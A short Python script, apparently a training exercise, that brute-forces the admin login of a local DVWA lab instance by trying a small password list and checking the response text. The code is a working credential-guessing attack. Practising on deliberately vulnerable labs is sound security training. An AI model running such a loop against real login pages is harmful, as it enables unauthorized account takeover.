import requests

base_url = "http://localhost/DVWA/vulnerabilities/brute/index.php"

cookies = {
    'security': 'low',
    'PHPSESSID': '3egvk4h4fnh4c8eu3q0o2knmq2'
}


passwords = ["88888", "password", "admin", "admin123", "amdkw"]


username = "admin"

def try_login(username, password):

    params = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }


    response = requests.get(base_url, params=params, cookies=cookies)


    if "Username and/or password incorrect." not in response.text:
        print(f"Успех! Пароль для {username}: {password}")
        return True
    else:
        print(f"Неверный пароль: {password}")
        return False


for password in passwords:
    if try_login(username, password):
        break
